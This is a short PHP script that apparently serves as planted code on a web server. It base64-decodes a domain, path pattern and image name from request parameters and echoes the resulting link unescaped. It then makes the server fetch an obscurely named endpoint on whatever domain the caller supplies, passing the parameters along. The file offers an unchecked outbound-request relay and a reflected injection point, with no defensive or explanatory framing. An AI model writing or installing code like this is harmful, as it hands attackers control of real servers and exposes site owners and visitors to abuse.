<?php
$domain = base64_decode(trim($_REQUEST['domain']));
$pattern = base64_decode(trim($_REQUEST['patt']));
$img = base64_decode(trim($_REQUEST['img']));
$image = str_replace(" ","_",$img);
$image_encode = base64_encode($image);

echo $image_link = "$domain$pattern$image";
$call = file_get_contents($domain."/aiwmaooduwiswmmairuploadfiew?domain=".$_REQUEST['domain']."&pattern=".$_REQUEST['patt']."&img=".$image_encode);